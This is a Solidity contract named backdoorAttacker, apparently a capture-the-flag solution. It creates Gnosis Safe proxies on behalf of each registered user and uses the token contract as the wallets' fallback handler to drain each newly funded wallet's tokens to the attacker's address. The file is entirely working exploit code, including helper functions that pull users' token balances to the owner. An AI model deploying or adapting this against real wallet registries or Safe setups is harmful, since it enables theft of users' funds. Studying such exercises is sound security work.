// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity >=0.7.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

contract backdoorAttacker {
    address public singleton;
    GnosisSafeProxyFactory public proxyFactory;
    ERC20 public token;
    address[] public users;
    address public owner;
    IProxyCreationCallback public walletRegistry;

    GnosisSafeProxy[] public proxies;

    constructor(
        address _gnosisSafe,
        GnosisSafeProxyFactory _proxyFactory,
        ERC20 _token,
        address[] memory _users,
        IProxyCreationCallback _walletRegistry
    ) {
        singleton = _gnosisSafe;
        proxyFactory = _proxyFactory;
        token = _token;
        users = _users;
        walletRegistry = _walletRegistry;
        owner = msg.sender;
    }

    // to have same signature as erc20 approve
    function approve(address, uint256 amount) public {
        bool ok = token.approve(address(this), amount);
        require(ok, "BA approve failed");
    }

    function transferFrom(address user) public {
        uint256 balance = token.balanceOf(user);
        require(
            token.transferFrom(user, owner, balance),
            "BA transferFrom failed"
        );
    }

    function createBackdoor() public {
        uint length = users.length;
        address[] memory user = new address[](1);

        for (uint i = 0; i < length; i++) {
            user[0] = users[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                user, // must be array
                1,
                address(0),
                0x00,
                token,
                address(0),
                0,
                address(0)
            );

            address proxy = address(
                proxyFactory.createProxyWithCallback(
                    singleton,
                    initializer,
                    1,
                    walletRegistry
                )
            );

            bool ok = IERC20(proxy).transfer(owner, 10 ether);
            require(ok, "Token transfer failed");
        }
    }
}
